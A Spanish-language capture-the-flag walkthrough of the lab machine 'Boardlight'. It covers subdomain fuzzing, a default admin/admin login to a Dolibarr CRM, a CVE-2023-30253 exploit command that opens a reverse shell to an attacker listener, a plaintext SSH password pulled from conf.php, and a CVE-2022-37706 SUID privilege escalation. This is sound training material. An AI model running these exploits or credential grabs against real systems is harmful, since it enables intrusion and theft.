Maquina: Boardlight

Autor:

Dificultad: Facil

![Captura de pantalla 2024-11-22 193110](https://github.com/user-attachments/assets/50597a1c-5ff7-44f4-959d-8c050b6351fc)

Iniciamos la máquina y verificamos la conexión

ping 10.129.135.122 -c 1

![Captura de pantalla 2024-11-22 172418](https://github.com/user-attachments/assets/c9c51461-5ddf-40fd-bc37-f68b81b42804)

Enumeramos la maquina con nmap 

nmap -sV 10.129.135.122

![Captura de pantalla 2024-11-22 172457](https://github.com/user-attachments/assets/3706ea38-97c1-41ea-aaed-23b3fc4e8e09)

añadimos la ip para que nos deje entrar en la web

echo 10.129.231.37 board.htb | sudo tee -a /etc/hosts

En la web muestra 'Bienvenido a BOARDLIGHT' mantenida por Board.htb.

wfuzz -c --hl=517  -t 200 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.board.htb" http://board.htb/

encontramos el subdominio crm lo añadimos a /etc/hosts/

![Captura de pantalla 2024-11-22 185430](https://github.com/user-attachments/assets/72c2670b-715b-462d-88a2-45a685d14767)

nano /etc/hosts/

10.129.231.37 board.htb crm.board.htb

http://crm.board.htb/

![Captura de pantalla 2024-11-22 185530](https://github.com/user-attachments/assets/b0ca9bc2-5681-497d-8f25-71fce2e490d1)

Es un panel de login por lo que probamos las credenciales más comunes. Probamos admin tanto para contraseña y usuario y nos deja iniciar sesión correctamente.

![Captura de pantalla 2024-11-22 185541](https://github.com/user-attachments/assets/88ec3787-919b-4d86-9634-0c9f66c78c6f)

Revisamos la versión por Internet si tiene alguna vulnerabilidad. Efectivamente tiene una vulnerabilidad que intentaremos explotar haciendo una Reverse Shell.

"Copiemos esta versión Dolibarr 17.0.0 y busquemos el exploit en Google, y encontrarás un exploit CVE-2023–30253.

https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253

![Captura de pantalla 2024-11-22 185358](https://github.com/user-attachments/assets/570b2a4d-570f-4ff9-a3a7-9dbffa7f35c2)

Ejecutamos el script mientras nos ponemos en escucha para conectarnos.

python3 exploit.py http://crm.board.htb admin admin 10.10.14.101 4444

![Captura de pantalla 2024-11-22 185804](https://github.com/user-attachments/assets/b6d1e5b0-2160-4ac7-83e0-721f05990401)

nc -lvnp 4444

![Captura de pantalla 2024-11-22 185811](https://github.com/user-attachments/assets/65d8e1ef-1d9b-4a45-960d-f17d71cc7cac)

Revisamos todos los archivos y encontramos la contraseña ssh en el archivo conf.php. Vamos a comprobar el nombre de usuario. 

![Captura de pantalla 2024-11-22 185943](https://github.com/user-attachments/assets/09bfdc4c-6eac-424f-8dbc-fbeaa5c6930b)

Vemos que hay un directorio larissa en cd /home/.

cd ..

cd ..

cd conf

cat conf.php

![Captura de pantalla 2024-11-22 190204](https://github.com/user-attachments/assets/d4f15947-6adf-4d8a-9854-d58021af2fc9)

nos conectamos por ssh con larissa 
serverfun2$2023!!

![Captura de pantalla 2024-11-22 190435](https://github.com/user-attachments/assets/57e90c65-13b4-4d88-8e36-136286cd4a2e)

ls

cat user.txt

![Captura de pantalla 2024-11-22 190459](https://github.com/user-attachments/assets/af32936b-9752-4c40-9da7-a8f4218233c5)

find / -perm -4000 -user root 2>/dev/null | xargs ls -l

![Captura de pantalla 2024-11-22 191509](https://github.com/user-attachments/assets/5a3b01b7-3a71-4099-80d3-d906a24fcf4e)

![Captura de pantalla 2024-11-22 191538](https://github.com/user-attachments/assets/409aeec7-2546-4c93-b440-e6e2a1fea5c3)

SUID exploited using CVE-2022–37706

Buscamos el código del script en GitHub, lo copiamos y lo pegamos en un nuevo archivo exploit.sh en el directorio del usuario Larissa.

nano exploit.sh

Para ejecutar el script, necesitamos otorgarle permisos de ejecución

chmod +x exploit.sh

![Captura de pantalla 2024-11-22 192430](https://github.com/user-attachments/assets/5d37fe12-8fa4-4a5e-90b6-5e9198c3a781)

Ejecutamos el script 

bash exploit.sh  

![Captura de pantalla 2024-11-22 192500](https://github.com/user-attachments/assets/c9a489b1-2703-4215-84ff-d20aa4cf0f24)

./exploit.sh

ls

whoami

cd..

cd..

ls

cd root

cat root.txt

![Captura de pantalla 2024-11-22 192612](https://github.com/user-attachments/assets/67a8507a-93f1-442a-9007-9d241d8da05b)

